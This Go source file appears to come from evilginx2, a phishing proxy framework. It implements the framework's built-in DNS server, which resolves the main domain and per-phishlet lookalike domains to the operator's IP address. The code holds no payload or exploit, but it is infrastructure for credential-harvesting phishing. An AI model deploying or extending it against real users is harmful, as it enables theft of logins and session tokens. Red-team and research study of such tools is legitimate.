package core

import (
	"context"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"

	"github.com/miekg/dns"

	"github.com/kgretzky/evilginx2/log"
)

type Nameserver struct {
	srv    *dns.Server
	cfg    *Config
	bind   string
	serial uint32
	ctx    context.Context
}

func NewNameserver(cfg *Config) (*Nameserver, error) {
	o := &Nameserver{
		serial: uint32(time.Now().Unix()),
		cfg:    cfg,
		bind:   fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), cfg.GetDnsPort()),
		ctx:    context.Background(),
	}

	o.Reset()

	return o, nil
}

func (o *Nameserver) Reset() {
	if o.cfg.general.Domain != "" {
		dns.HandleFunc(pdom(o.cfg.general.Domain), o.handleRequest)
	}

	// Register handlers for per-phishlet domains
	registeredDomains := make(map[string]bool)
	if o.cfg.general.Domain != "" {
		registeredDomains[o.cfg.general.Domain] = true
	}
	for _, name := range o.cfg.GetPhishletNames() {
		domain := o.cfg.GetPhishletDomain(name)
		if domain != "" && !registeredDomains[domain] {
			dns.HandleFunc(pdom(domain), o.handleRequest)
			registeredDomains[domain] = true
		}
	}
}

func (o *Nameserver) Start() {
	go func() {
		o.srv = &dns.Server{Addr: o.bind, Net: "udp"}
		if err := o.srv.ListenAndServe(); err != nil {
			log.Fatal("Failed to start nameserver on: %s", o.bind)
		}
	}()
}

func (o *Nameserver) handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)

	if o.cfg.general.ExternalIpv4 == "" {
		return
	}

	fqdn := strings.ToLower(r.Question[0].Name)

	// Determine which domain this query belongs to
	baseDomain := o.cfg.general.Domain
	for _, name := range o.cfg.GetPhishletNames() {
		domain := o.cfg.GetPhishletDomain(name)
		if domain != "" && strings.HasSuffix(fqdn, pdom(domain)) {
			baseDomain = domain
			break
		}
	}

	if baseDomain == "" {
		return
	}

	soa := &dns.SOA{
		Hdr:     dns.RR_Header{Name: pdom(baseDomain), Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 300},
		Ns:      "ns1." + pdom(baseDomain),
		Mbox:    "hostmaster." + pdom(baseDomain),
		Serial:  o.serial,
		Refresh: 900,
		Retry:   900,
		Expire:  1800,
		Minttl:  60,
	}
	m.Ns = []dns.RR{soa}

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		log.Debug("DNS SOA: " + fqdn)
		m.Answer = append(m.Answer, soa)
	case dns.TypeA:
		log.Debug("DNS A: " + fqdn + " = " + o.cfg.general.ExternalIpv4)
		rr := &dns.A{
			Hdr: dns.RR_Header{Name: fqdn, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 300},
			A:   net.ParseIP(o.cfg.general.ExternalIpv4),
		}
		m.Answer = append(m.Answer, rr)
	case dns.TypeNS:
		log.Debug("DNS NS: " + fqdn)
		if fqdn == pdom(baseDomain) {
			for _, i := range []int{1, 2} {
				rr := &dns.NS{
					Hdr: dns.RR_Header{Name: pdom(baseDomain), Rrtype: dns.TypeNS, Class: dns.ClassINET, Ttl: 300},
					Ns:  "ns" + strconv.Itoa(i) + "." + pdom(baseDomain),
				}
				m.Answer = append(m.Answer, rr)
			}
		}
	}
	w.WriteMsg(m)
}

func pdom(domain string) string {
	return domain + "."
}
